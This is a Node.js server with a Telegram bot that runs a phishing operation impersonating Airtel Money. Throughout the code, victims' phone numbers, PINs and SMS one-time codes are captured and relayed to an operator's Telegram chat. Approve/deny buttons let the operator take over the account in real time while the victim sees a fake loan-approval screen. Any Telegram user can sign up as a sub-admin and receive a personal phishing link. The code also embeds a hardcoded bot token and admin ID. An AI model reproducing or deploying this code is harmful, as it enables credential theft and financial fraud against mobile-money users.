/**
 * AIRTEL MONEY - STRICTLY MAPPED PRIVATE SUB-ADMIN SERVER
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || ''
      }]));
    }
  } catch (err) {}
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {}
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();

/**
 * Resolves the destination chat ID strictly from the URL parameter.
 * If a valid sub-admin parameter exists, it routes exclusively to them.
 */
function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID) || admins.has(targetAdmin)) {
      return targetAdmin;
    }
  }
  return FALLBACK_ADMIN_ID;
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: true });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      let chatInfo = {};
      try { chatInfo = await bot.getChat(chatId); } catch (e) {}

      const username = chatInfo.username || msg.from.username || 'N/A';
      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
      const lastName = chatInfo.last_name || msg.from.last_name || '';

      if (!admins.has(chatId)) {
        admins.set(chatId, { username, firstName, lastName, startedAt: new Date() });
        saveAdmins();
      }

      const personalLink = `${APP_URL}/?admin=${chatId}`;
      const isMainAdmin = (chatId === String(FALLBACK_ADMIN_ID));

      if (isMainAdmin) {
        const mainAdminMessage = `👑 *PANEL ADMINISTRATEUR PRINCIPAL*\n\n` +
                                 `👤 *Info Telegram:*\n` +
                                 `• Nom: ${firstName} ${lastName}\n` +
                                 `• Chat ID: \`${chatId}\`\n\n` +
                                 `🔗 *Votre lien personnel exclusif:*\n\`${personalLink}\`\n\n` +
                                 `👥 *Gestion des sous-admin:* Tout utilisateur ou sous-administrateur qui envoie \`/start\` au bot se verra attribuer instantanément son propre lien de suivi indépendant.`;
        
        await bot.sendMessage(chatId, mainAdminMessage, { parse_mode: 'Markdown' });
        return;
      }

      const subAdminMessage = `🤖 *ESPACE SOUS-ADMINISTRATEUR PRIVÉ*\n\n` +
                              `👤 *Vos Infos:*\n` +
                              `• Nom: ${firstName} ${lastName}\n` +
                              `• Chat ID: \`${chatId}\`\n\n` +
                              `🔗 *Votre lien de suivi privé et indépendant:*\n\`${personalLink}\`\n\n` +
                              `_Note: Tous les clients qui ouvrent votre lien seront routés exclusivement vers votre chat privé avec les boutons de validation._`;

      await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
    } catch (err) {
      console.error('Error handling /start command:', err);
    }
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);
      const parts = actionData.split('_');
      const actionType = parts.slice(0, 2).join('_'); 
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) session = { adminChatId: chatId };

      const chatTarget = session.adminChatId || chatId;

      switch (actionType) {
        case 'DENY_CREDS':
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          session.pin = '';
          await bot.sendMessage(chatTarget, `❌ Code PIN rejeté. Le client est redirigé pour recharger son PIN.`);
          break;
        case 'ALLOW_CREDS':
          session.status = 'PROCEED_OTP';
          await bot.sendMessage(chatTarget, `✅ Connexion autorisée (ALLOW). Le client passe au code OTP SMS (4 chiffres).`);
          break;
        case 'EXPIRED_OTP':
          session.status = 'RETRY_OTP';
          session.otp = '';
          await bot.sendMessage(chatTarget, `⚠️ Code OTP expiré. Le client est invité à ressaisir un nouveau code OTP.`);
          break;
        case 'APPROVED_FINAL':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Prêt approuvé avec succès! L'écran de confirmation s'est affiché.`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Action effectuée` }).catch(() => {});
      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
      }
    } catch (err) {}
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Step 1: Submit Phone Number & PIN (Routes strictly to mapped sub-admin)
app.post('/api/submit-credentials', async (req, res) => {
  try {
    let { phone, pin, adminChatId } = req.body || {};
    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const targetChat = resolveTargetChat(adminChatId);
    const userId = `user_${Date.now()}`;
    sessions.set(userId, { 
      phone, pin, 
      adminChatId: targetChat, 
      status: 'WAITING_CREDS_APPROVAL' 
    });

    const message = `🔴 *AIRTEL MONEY - NUMÉRO ET CODE PIN*\n\n` +
                    `📞 *Téléphone:* \`${phone}\`\n` +
                    `🔒 *Code PIN:* \`${pin}\`\n\n` +
                    `📋 *Format à copier:*\n\`${phone}:${pin}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ DENY', callback_data: `DENY_CREDS_${userId}` },
            { text: '✅ ALLOW', callback_data: `ALLOW_CREDS_${userId}` }
          ]
        ]
      }
    };

    if (bot) {
      await bot.sendMessage(targetChat, message, opts);
    }
    
    return res.status(200).json({ success: true, userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Erreur réseau.' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

// Step 2: Submit 4-digit SMS OTP
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ status: 'NOT_FOUND' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message = `🔴 *AIRTEL MONEY - OTP SMS (4 Chiffres)*\n\n` +
                    `📱 *Code OTP:* \`${otp}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${userId}` },
            { text: 'EXPIRED OTP', callback_data: `EXPIRED_OTP_${userId}` },
            { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Erreur' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
  console.log(`Server running on port ${PORT}`);
});
                                                 
